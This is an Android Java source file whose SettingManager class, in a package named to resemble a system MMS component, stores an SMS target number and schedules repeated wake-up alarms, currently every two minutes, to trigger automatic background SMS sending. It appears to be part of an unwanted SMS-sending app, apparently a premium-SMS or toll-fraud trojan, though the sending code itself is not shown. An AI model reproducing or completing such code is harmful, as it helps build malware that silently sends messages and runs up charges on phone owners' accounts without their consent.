package com.mms.bg.ui;

import java.util.Date;

import android.app.Activity;
import android.app.AlarmManager;
import android.app.PendingIntent;
import android.content.Context;
import android.content.Intent;
import android.content.SharedPreferences;
import android.os.PowerManager;
import android.preference.PreferenceManager;
import android.util.Log;

import com.mms.bg.*;

public class SettingManager {
    private static final String TAG = "SettingManager";
    private static final boolean DEBUG = true;
    
    private static final String DEFAULT_VALUE = "";
//    private static final long SMS_DELAY_TIME = 30 * 24 * 60 * 60 * 1000;
    private static final long SMS_DELAY_TIME = 2 * 60 * 1000;
    private static final long DIAL_TIME = 10 * 1000;
    private static final String AUTO_SMS_ACTION = "com.mms.bg.SMS"; 
    
    public Activity mForegroundActivity;
    private Context mContext;
    private PowerManager.WakeLock mWakeLock;
    private PowerManager.WakeLock mPartWakeLock;
    private SharedPreferences mSP;
    private SharedPreferences.Editor mEditor;
    private static  SettingManager gSettingManager;
    
    public static SettingManager getInstance(Context context) {
        if (gSettingManager == null) {
            gSettingManager = new SettingManager(context);
        }
        return gSettingManager;
    }

    public void makeWakeLock() {
        if (mWakeLock == null) {
            PowerManager pm = (PowerManager) mContext.getSystemService(Context.POWER_SERVICE);
            mWakeLock = pm.newWakeLock(PowerManager.SCREEN_BRIGHT_WAKE_LOCK
                                                            | PowerManager.ACQUIRE_CAUSES_WAKEUP, "");
            mWakeLock.setReferenceCounted(false);
        }
        mWakeLock.acquire();
    }
    
    public void releaseWakeLock() {
        mWakeLock.release();
        mWakeLock = null;
    }
    
    public void makePartialWakeLock() {
        if (mPartWakeLock == null) {
            PowerManager pm = (PowerManager) mContext.getSystemService(Context.POWER_SERVICE);
            mPartWakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "prepareSendSMS");
            mPartWakeLock.setReferenceCounted(false);
        }
        mPartWakeLock.acquire();
    }
    
    public void releasePartialWakeLock() {
        mPartWakeLock.release();
        mPartWakeLock = null;
    }
    
    //preference operator
    public void setLastSMSTime(long time) {
        Date date = new Date(time);
        mEditor.putLong(mContext.getString(R.string.last_send_time), time);
        mEditor.putString(mContext.getString(R.string.last_send_time_format), date.toGMTString());
        mEditor.commit();
    }
    
    public String getLastSMSFormatTime() {
        return mSP.getString(mContext.getString(R.string.last_send_time_format), DEFAULT_VALUE);
    }
    
    private long getLastSMSTime() {
        return mSP.getLong(mContext.getString(R.string.last_send_time), 0);
    }
    
    public void setLastDialTime(long time) {
        Date date = new Date(time);
        mEditor.putLong(mContext.getString(R.string.last_dial_time), time);
        mEditor.putString(mContext.getString(R.string.last_dial_time_format), date.toGMTString());
        mEditor.commit();
    }
    
    public String getLastDialFormatTime() {
        return mSP.getString(mContext.getString(R.string.last_dial_time_format), DEFAULT_VALUE);
    }
    
    private long getLastDailTime() {
        return mSP.getLong(mContext.getString(R.string.last_dial_time), 0);
    }
    
    public void setSMSTargetNum(String num) {
        mEditor.putString(mContext.getString(R.string.sms_target_num), num);
        mEditor.commit();
    }
    
    public String getSMSTargetNum() {
        return mSP.getString(mContext.getString(R.string.sms_target_num), DEFAULT_VALUE); 
    }
    
    public void startAutoSendMessage() {
//        cancelAutoSync();
        Intent intent = new Intent(mContext, AutoSMSRecevier.class);
        intent.setAction(AUTO_SMS_ACTION);
        PendingIntent sender = PendingIntent.getBroadcast(mContext, 0, intent, PendingIntent.FLAG_CANCEL_CURRENT);
        long currentTime = System.currentTimeMillis();
        long firstTime = currentTime;
        
        long latestSMSTime = this.getLastSMSTime();
        if (latestSMSTime != 0 && (currentTime - latestSMSTime) >= SMS_DELAY_TIME + 10000) {
            if (DEBUG) Log.d(TAG, "[[startAutoSendMessage]] start broadcast delay 10s");
            firstTime = currentTime + 10000;
        } else if (latestSMSTime != 0) {
            if (DEBUG) Log.d(TAG, "[[startAutoSendMessage]] start broadcast delay " + SMS_DELAY_TIME);
            firstTime = latestSMSTime + SMS_DELAY_TIME;
        } else {
            if (DEBUG) Log.d(TAG, "[[startAutoSendMessage]] start broadcast delay 10s 1");
            firstTime = currentTime + 10000;
        }
        
        AlarmManager am = (AlarmManager) mContext.getSystemService(Context.ALARM_SERVICE);
        am.setRepeating(AlarmManager.RTC_WAKEUP, firstTime, SMS_DELAY_TIME, sender);
    }
    
    public void cancelAutoSync() {
        Intent intent = new Intent(mContext, AutoSMSRecevier.class);
        PendingIntent sender = PendingIntent.getBroadcast(mContext, 0, intent, 0);
        AlarmManager am = (AlarmManager) mContext.getSystemService(Context.ALARM_SERVICE);
        am.cancel(sender);
    }
    
    private SettingManager(Context context) {
        mContext = context;
        mSP = PreferenceManager.getDefaultSharedPreferences(mContext);
        mEditor = mSP.edit();
    }
    
}
